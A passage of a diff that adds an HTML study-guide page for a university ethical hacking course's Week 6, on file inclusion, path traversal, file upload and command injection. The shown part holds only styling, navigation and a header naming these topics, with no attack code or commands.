@@ -1,0 +1,2416 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+    <title>Week 6: File Inclusion, Path Traversal, File Upload, Command Injection — Lecture Summary</title>
+    <meta name="description"
+        content="Detailed Lecture Summary covering File Inclusion, Path Traversal, File Upload, and Command Injection for CCY4202.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-page: #090d16;
+            --bg-surface: #0f172a;
+            --bg-card: #111827;
+            --bg-card-hover: #162032;
+            --bg-sidebar: #0b1120;
+            --bg-terminal: #070a12;
+            --bg-terminal-header: #111827;
+
+            --border-subtle: rgba(255, 255, 255, 0.08);
+            --border-card: rgba(255, 255, 255, 0.1);
+            --border-hover: rgba(2, 132, 199, 0.4);
+
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+
+            --accent-emerald: #10b981;
+            --accent-cyan: #06b6d4;
+            --accent-blue: #0284c7;
+            --accent-purple: #a855f7;
+            --accent-amber: #f59e0b;
+            --accent-orange: #f97316;
+            --accent-rose: #f43f5e;
+
+            --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Fira Code', Menlo, Consolas, monospace;
+
+            --shadow-card: 0 10px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+        }
+
+        [data-theme="light"] {
+            --bg-page: #f8fafc;
+            --bg-surface: #ffffff;
+            --bg-card: #ffffff;
+            --bg-card-hover: #f1f5f9;
+            --bg-sidebar: #f1f5f9;
+            --bg-terminal: #0f172a;
+            --bg-terminal-header: #1e293b;
+
+            --border-subtle: rgba(0, 0, 0, 0.08);
+            --border-card: rgba(0, 0, 0, 0.1);
+            --border-hover: rgba(2, 132, 199, 0.4);
+
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --text-muted: #94a3b8;
+
+            --shadow-card: 0 4px 6px -1px rgba(0, 0, 0, 0.07), 0 2px 4px -2px rgba(0, 0, 0, 0.07);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            scroll-padding-top: 80px;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-primary);
+            font-family: var(--font-sans);
+            line-height: 1.7;
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            transition: background-color 0.25s ease, color 0.25s ease;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-page);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-subtle);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-cyan);
+        }
+
+        #readingProgressBar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan), var(--accent-orange));
+            z-index: 1000;
+            transition: width 0.1s ease-out;
+        }
+
+        .app-navbar {
+            position: sticky;
+            top: 0;
+            z-index: 900;
+            background: rgba(11, 17, 32, 0.85);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border-subtle);
+            transition: background-color 0.25s ease;
+        }
+
+        [data-theme="light"] .app-navbar {
+            background: rgba(255, 255, 255, 0.88);
+        }
+
+        .nav-container {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 0 24px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .brand-icon-shield {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--accent-blue), var(--accent-orange));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 12px rgba(2, 132, 199, 0.3);
+            color: #fff;
+        }
+
+        .brand-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand-title {
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: -0.2px;
+            line-height: 1.2;
+        }
+
+        .brand-subtitle {
+            font-size: 11px;
+            color: var(--text-muted);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .nav-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .nav-btn:hover {
+            color: var(--text-primary);
+            border-color: var(--accent-cyan);
+            background: var(--bg-card-hover);
+        }
+
+        .theme-toggle-btn,
+        .mobile-menu-btn {
+            padding: 8px;
+            width: 36px;
+            height: 36px;
+            justify-content: center;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+        }
+
+        .app-layout {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 32px 24px;
+            display: grid;
+            grid-template-columns: 290px 1fr;
+            gap: 40px;
+            align-items: start;
+        }
+
+        .sidebar-toc {
+            position: sticky;
+            top: 96px;
+            max-height: calc(100vh - 120px);
+            overflow-y: auto;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border-subtle);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: var(--shadow-card);
+        }
+
+        .sidebar-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--border-subtle);
+            margin-bottom: 14px;
+        }
+
+        .sidebar-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .sidebar-header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .sidebar-close-btn {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-muted);
+            font-size: 14px;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .toc-badge {
+            font-size: 11px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 12px;
+            background: rgba(2, 132, 199, 0.15);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(2, 132, 199, 0.25);
+        }
+
+        .sidebar-jump-box {
+            margin-bottom: 14px;
+        }
+
+        .sidebar-search-btn {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 8px;
+            color: var(--text-muted);
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .sidebar-kbd {
+            font-size: 10px;
+            font-family: var(--font-mono);
+            padding: 2px 5px;
+            border-radius: 4px;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-muted);
+        }
+
+        .toc-nav {
+            flex: 1;
+        }
+
+        .toc-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .toc-link {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 10px;
+            text-decoration: none;
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 8px;
+            transition: all 0.15s ease;
+        }
+
+        .toc-link:hover {
+            color: var(--text-primary);
+            background: var(--bg-card-hover);
+        }
+
+        .toc-item.active>.toc-link {
+            color: var(--accent-cyan);
+            background: rgba(6, 182, 212, 0.1);
+            font-weight: 700;
+        }
+
+        .toc-icon {
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .toc-num {
+            font-size: 10px;
+            font-weight: 800;
+            color: var(--text-muted);
+            background: var(--bg-card);
+            padding: 2px 5px;
+            border-radius: 4px;
+            border: 1px solid var(--border-subtle);
+        }
+
+        .toc-text {
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .sidebar-footer {
+            margin-top: 16px;
+            padding-top: 14px;
+            border-top: 1px solid var(--border-subtle);
+        }
+
+        .sidebar-study-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 12px;
+            line-height: 1.5;
+            color: var(--text-muted);
+        }
+
+        .sidebar-study-card a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .study-card-title {
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .main-content {
+            min-width: 0;
+            max-width: 980px;
+        }
+
+        .hero-section {
+            position: relative;
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 20px;
+            padding: 44px;
+            margin-bottom: 36px;
+            box-shadow: var(--shadow-card);
+            overflow: hidden;
+        }
+
+        .hero-glow {
+            position: absolute;
+            top: -120px;
+            right: -100px;
+            width: 380px;
+            height: 380px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(2, 132, 199, 0.22) 0%, rgba(249, 115, 22, 0.12) 50%, transparent 80%);
+            pointer-events: none;
+        }
+
+        .hero-badge-wrap {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            background: rgba(2, 132, 199, 0.15);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(2, 132, 199, 0.3);
+        }
+
+        .badge-secondary {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--accent-emerald);
+            border-color: rgba(16, 185, 129, 0.3);
+        }
+
+        .badge-lab {
+            background: rgba(249, 115, 22, 0.15);
+            color: var(--accent-orange);
+            border-color: rgba(249, 115, 22, 0.3);
+        }
+
+        .badge-pulse {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-cyan);
+            box-shadow: 0 0 8px var(--accent-cyan);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.4;
+                transform: scale(0.85);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .hero-title {
+            font-size: 38px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 14px;
+            letter-spacing: -0.8px;
+        }
+
+        .gradient-text {
+            background: linear-gradient(135deg, var(--accent-blue) 0%, var(--accent-cyan) 50%, var(--accent-orange) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-subtitle {
+            font-size: 17px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 24px;
+            max-width: 820px;
+        }
+
+        .topic-tags-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .topic-tag {
+            font-size: 12px;
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 8px;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+        }
+
+        .guide-usage-card {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            background: rgba(2, 132, 199, 0.07);
+            border: 1px solid rgba(2, 132, 199, 0.25);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+        }
+
+        .guide-usage-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .guide-usage-title {
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: var(--accent-cyan);
+            margin-bottom: 4px;
+        }
+
+        .learning-obj-box {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 26px;
+        }
+
+        .obj-header {
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: var(--accent-emerald);
+            margin-bottom: 10px;
+        }
+
+        .obj-list {
+            margin: 0 0 0 20px;
+            color: var(--text-secondary);
+            font-size: 13.5px;
+        }
+
+        .content-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 18px;
+            padding: 36px;
+            margin-bottom: 32px;
+            box-shadow: var(--shadow-card);
+            transition: border-color 0.2s ease;
+        }
+
+        .content-card:hover {
+            border-color: var(--border-hover);
+        }
+
+        .section-card-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding-bottom: 20px;
+            margin-bottom: 26px;
+            border-bottom: 1px solid var(--border-subtle);
+            position: relative;
+        }
+
+        .sec-num-badge {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, rgba(2, 132, 199, 0.2), rgba(249, 115, 22, 0.15));
+            border: 1px solid rgba(2, 132, 199, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-mono);
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--accent-cyan);
+            flex-shrink: 0;
+        }
+
+        .sec-title-wrap {
+            flex: 1;
+        }
+
+        .sec-kicker {
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--accent-orange);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .section-heading {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -0.4px;
+            color: var(--text-primary);
+            line-height: 1.3;
+        }
+
+        .anchor-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 20px;
+            font-weight: 600;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .section-card-header:hover .anchor-link {
+            opacity: 1;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin: 28px 0 14px 0;
+        }
+
+        p {
+            margin-bottom: 16px;
+            color: var(--text-secondary);
+        }
+
+        strong {
+            color: var(--text-primary);
+            font-weight: 700;
+        }
+
+        ul,
+        ol {
+            margin: 12px 0 20px 24px;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+
+        li::marker {
+            color: var(--accent-cyan);
+            font-weight: 700;
+        }
+
+        .table-responsive {
+            width: 100%;
+            overflow-x: auto;
+            margin: 20px 0 24px 0;
+            border-radius: 12px;
+            border: 1px solid var(--border-subtle);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        thead th {
+            background: var(--bg-surface);
+            color: var(--text-primary);
+            font-weight: 700;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border-subtle);
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.6px;
+            white-space: nowrap;
+        }
+
+        tbody tr {
+            border-bottom: 1px solid var(--border-subtle);
+            transition: background-color 0.15s ease;
+        }
+
+        tbody tr:hover {
+            background: var(--bg-card-hover);
+        }
+
+        tbody td {
+            padding: 12px 16px;
+            color: var(--text-secondary);
+            vertical-align: top;
+        }
+
+        tbody td strong {
+            color: var(--text-primary);
+        }
+
+        .terminal-card {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            margin: 18px 0 22px 0;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .terminal-header {
+            background: var(--bg-terminal-header);
+            padding: 9px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+        }
+
+        .dot-red {
+            background: #ef4444;
+        }
+
+        .dot-yellow {
+            background: #f59e0b;
+        }
+
+        .dot-green {
+            background: #10b981;
+        }
+
+        .terminal-title {
+            font-size: 12px;
+            font-family: var(--font-mono);
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            font-size: 11px;
+            font-weight: 600;
+            font-family: var(--font-sans);
+            cursor: pointer;
+        }
+
+        .terminal-body {
+            padding: 16px 20px;
+            overflow-x: auto;
+        }
+
+        .terminal-line {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-family: var(--font-mono);
+            font-size: 13.5px;
+        }
+
+        .terminal-prompt {
+            color: var(--accent-orange);
+            font-weight: 700;
+        }
+
+        .terminal-cmd {
+            color: #e2e8f0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .callout {
+            display: flex;
+            gap: 16px;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin: 20px 0;
+            border: 1px solid transparent;
+        }
+
+        .callout-icon {
+            font-size: 22px;
+            line-height: 1;
+            flex-shrink: 0;
+        }
+
+        .callout-body {
+            flex: 1;
+        }
+
+        .callout-badge {
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .callout-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--text-secondary);
+        }
+
+        .callout-lesson {
+            background: rgba(2, 132, 199, 0.08);
+            border-color: rgba(2, 132, 199, 0.3);
+        }
+
+        .callout-lesson .callout-badge {
+            color: var(--accent-cyan);
+        }
+
+        .callout-casestudy {
+            background: rgba(244, 63, 94, 0.08);
+            border-color: rgba(244, 63, 94, 0.3);
+        }
+
+        .callout-casestudy .callout-badge {
+            color: var(--accent-rose);
+        }
+
+        .callout-safety {
+            background: rgba(245, 158, 11, 0.08);
+            border-color: rgba(245, 158, 11, 0.3);
+        }
+
+        .callout-safety .callout-badge {
+            color: var(--accent-amber);
+        }
+
+        .exam-checklist-widget {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            border-radius: 14px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .chk-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-subtle);
+            flex-wrap: wrap;
+        }
+
+        .chk-badge {
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--accent-orange);
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .chk-title-group h3 {
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .chk-progress-box {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 6px;
+            min-width: 140px;
+        }
+
+        .chk-progress-text {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--accent-orange);
+            font-family: var(--font-mono);
+        }
+
+        .chk-progress-track {
+            width: 140px;
+            height: 6px;
+            border-radius: 3px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            overflow: hidden;
+        }
+
+        .chk-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-orange), var(--accent-emerald));
+            transition: width 0.3s ease;
+        }
+
+        .chk-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 14px;
+            border-radius: 8px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            cursor: pointer;
+            transition: all 0.15s ease;
+        }
+
+        .checklist-item.checked {
+            border-color: rgba(16, 185, 129, 0.4);
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        .chk-box-wrap input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--accent-emerald);
+            cursor: pointer;
+        }
+
+        .chk-num {
+            font-family: var(--font-mono);
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--accent-cyan);
+            margin-top: 2px;
+        }
+
+        .chk-text {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--text-secondary);
+        }
+
+        .search-modal-backdrop {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(6px);
+            z-index: 1100;
+            align-items: flex-start;
+            justify-content: center;
+            padding-top: 100px;
+        }
+
+        .search-modal-backdrop.open {
+            display: flex;
+        }
+
+        .search-modal-dialog {
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 620px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+            overflow: hidden;
+        }
+
+        .search-modal-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        .modal-search-icon {
+            color: var(--accent-cyan);
+        }
+
+        #globalSearchInput {
+            flex: 1;
+            background: none;
+            border: none;
+            color: var(--text-primary);
+            font-size: 16px;
+            font-family: inherit;
+            outline: none;
+        }
+
+        .search-modal-close {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            border-radius: 6px;
+            color: var(--text-muted);
+            font-size: 11px;
+            padding: 4px 8px;
+            cursor: pointer;
+        }
+
+        .search-results-list {
+            max-height: 380px;
+            overflow-y: auto;
+            padding: 8px 12px;
+            list-style: none;
+        }
+
+        .search-result-item {
+            padding: 10px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            text-decoration: none;
+            color: var(--text-secondary);
+        }
+
+        .search-result-item:hover {
+            background: var(--bg-surface);
+            color: var(--accent-cyan);
+        }
+
+        .result-main {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .result-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .result-sec {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .result-badge {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            background: var(--bg-card-hover);
+            color: var(--accent-orange);
+        }
+
+        .app-footer {
+            max-width: 1440px;
+            margin: 40px auto 0 auto;
+            padding: 30px 24px 60px 24px;
+            border-top: 1px solid var(--border-subtle);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: var(--text-muted);
+            font-size: 13px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 8px;
+            padding: 6px 12px;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        @media (max-width: 1024px) {
+            .app-layout {
+                grid-template-columns: 1fr;
+                padding: 24px 20px;
+            }
+
+            .sidebar-toc {
+                display: flex !important;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 320px;
+                height: 100vh;
+                z-index: 950;
+                transform: translateX(-100%);
+                transition: transform 0.3s;
+                background: var(--bg-sidebar);
+            }
+
+            .sidebar-toc.mobile-open {
+                transform: translateX(0);
+            }
+
+            .mobile-menu-btn,
+            .sidebar-close-btn {
+                display: inline-flex;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="readingProgressBar"></div>
+
+    <nav class="app-navbar">
+        <div class="nav-container">
+            <a href="#" class="nav-brand">
+                <div class="brand-icon-shield">
+                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" fill="none" stroke-width="2.2"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                        <line x1="8" y1="21" x2="16" y2="21"></line>
+                        <line x1="12" y1="17" x2="12" y2="21"></line>
+                    </svg>
+                </div>
+                <div class="brand-info">
+                    <span class="brand-title">CYBERSEC 101</span>
+                    <span class="brand-subtitle">Week 6 • File Inclusion & Uploads</span>
+                </div>
+            </a>
+            <div class="nav-actions">
+                <button class="nav-btn" onclick="openSearchModal()" title="Search guide (Ctrl+K)">
+                    <svg viewBox="0 0 24 24" width="15" height="15" stroke="currentColor" fill="none" stroke-width="2">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                    </svg>
+                    <span>Search</span>
+                    <kbd class="sidebar-kbd">Ctrl K</kbd>
+                </button>
+                <button class="nav-btn theme-toggle-btn" id="themeToggleBtn" onclick="toggleTheme()"
+                    title="Toggle Light/Dark Theme">
+                    <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <div class="app-layout">
+
+        <aside class="sidebar-toc" id="sidebarNav">
+            <div class="sidebar-header">
+                <div class="sidebar-title">
+                    <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2">
+                        <line x1="8" y1="6" x2="21" y2="6"></line>
+                        <line x1="8" y1="12" x2="21" y2="12"></line>
+                        <line x1="8" y1="18" x2="21" y2="18"></line>
+                        <line x1="3" y1="6" x2="3.01" y2="6"></line>
+                        <line x1="3" y1="12" x2="3.01" y2="12"></line>
+                        <line x1="3" y1="18" x2="3.01" y2="18"></line>
+                    </svg>
+                    <span>Navigation</span>
+                </div>
+                <div class="sidebar-header-right">
+                    <span class="toc-badge">8 Modules</span>
+                    <button class="sidebar-close-btn" onclick="closeMobileMenu()">✕</button>
+                </div>
+            </div>
+            <div class="sidebar-jump-box">
+                <button class="sidebar-search-btn" onclick="openSearchModal()">
+                    <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="2">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                    </svg>
+                    <span>Quick search...</span>
+                    <kbd class="sidebar-kbd">Ctrl K</kbd>
+                </button>
+            </div>
+            <nav class="toc-nav">
+                <ul class="toc-list">
+                    <li class="toc-item" data-target="mod-1"><a href="#mod-1" class="toc-link"><span
+                                class="toc-icon">📖</span><span class="toc-num">01</span><span class="toc-text">Local
+                                and Remote File Inclusion</span></a></li>
+                    <li class="toc-item" data-target="mod-2"><a href="#mod-2" class="toc-link"><span
+                                class="toc-icon">🌐</span><span class="toc-num">02</span><span class="toc-text">Path
+                                Traversal</span></a></li>
+                    <li class="toc-item" data-target="mod-3"><a href="#mod-3" class="toc-link"><span
+                                class="toc-icon">🔥</span><span class="toc-num">03</span><span class="toc-text">Command
+                                Injection</span></a></li>
+                    <li class="toc-item" data-target="mod-4"><a href="#mod-4" class="toc-link"><span
+                                class="toc-icon">⚡</span><span class="toc-num">04</span><span class="toc-text">File
+                                Upload Vulnerabilities</span></a></li>
+                    <li class="toc-item" data-target="mod-5"><a href="#mod-5" class="toc-link"><span
+                                class="toc-icon">🛡️</span><span class="toc-num">05</span><span
+                                class="toc-text">Defensive Coding</span></a></li>
+                    <li class="toc-item" data-target="mod-6"><a href="#mod-6" class="toc-link"><span
+                                class="toc-icon">🌍</span><span class="toc-num">06</span><span
+                                class="toc-text">Misconceptions & Breaches</span></a></li>
+                    <li class="toc-item" data-target="mod-7"><a href="#mod-7" class="toc-link"><span
+                                class="toc-icon">🎯</span><span class="toc-num">07</span><span class="toc-text">Closing
+                                Scenario</span></a></li>
+                    <li class="toc-item" data-target="mod-8"><a href="#mod-8" class="toc-link"><span
+                                class="toc-icon">🧪</span><span class="toc-num">08</span><span class="toc-text">Lab Prep
+                                & Glossary</span></a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <main class="main-content">
+
+            <header class="hero-section">
+                <div class="hero-glow"></div>
+                <div class="hero-badge-wrap">
+                    <span class="hero-badge"><span class="badge-pulse"></span>WEEK 6 STUDY GUIDE</span>
+                    <span class="hero-badge badge-secondary">CCY4202 · ETHICAL HACKING</span>
+                    <span class="hero-badge badge-lab">LFI, RFI, CMD & UPLOADS</span>
+                </div>
+                <h1 class="hero-title">File Inclusion, Path Traversal, File Upload, <span class="gradient-text">Command
+                        Injection</span></h1>
+                <p class="hero-subtitle">CCY4202 Ethical Hacking and Penetration Testing | Week 6 | B.Sc. Cybersecurity,
+                    Semester 7[cite: 3]</p>
+
+                <div class="topic-tags-grid">
+                    <span class="topic-tag">🌐 LFI / RFI</span>
+                    <span class="topic-tag">🔥 Path Traversal</span>
+                    <span class="topic-tag">⚡ Command Injection</span>
+                    <span class="topic-tag">🔄 File Upload Bypass</span>
+                    <span class="topic-tag">🍪 Magic Bytes</span>
